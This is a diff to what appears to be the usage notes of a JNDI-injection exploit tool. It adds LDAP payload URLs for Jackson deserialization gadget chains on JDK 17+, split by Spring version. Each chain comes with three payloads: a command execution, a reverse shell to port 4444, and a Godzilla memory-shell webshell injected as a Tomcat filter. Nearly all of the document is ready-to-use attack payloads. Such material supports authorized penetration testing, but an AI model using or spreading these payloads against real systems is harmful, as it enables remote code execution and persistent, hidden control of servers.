@@ -548,9 +548,24 @@ ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/MemShell/Tomcat/Godzilla/F
 
 # Jackson deserialization
 # Use JdkDynamicAopProxy to optimize instability issues, need spring-aop dependency
+
+# for JDK 8
 ldap://127.0.0.1:1389/Deserialize/Jackson/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Jackson/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Deserialize/Jackson/MemShell/Tomcat/Godzilla/Filter
+
+# for JDK 17+
+# Because the serialVersionUID of DefaultAdvisorChainFactory differs between versions before and after Spring 6.0.10, it is divided into two versions
+
+# Jackson17A: Spring < 6.0.10
+ldap://127.0.0.1:1389/Deserialize/Jackson17A/Command/open -a Calculator
+ldap://127.0.0.1:1389/Deserialize/Jackson17A/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/Jackson17A/MemShell/Tomcat/Godzilla/Filter
+
+# Jackson17B: Spring >= 6.0.10
+ldap://127.0.0.1:1389/Deserialize/Jackson17B/Command/open -a Calculator
+ldap://127.0.0.1:1389/Deserialize/Jackson17B/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/Jackson17B/MemShell/Tomcat/Godzilla/Filter
 
 # Fastjson deserialization
 
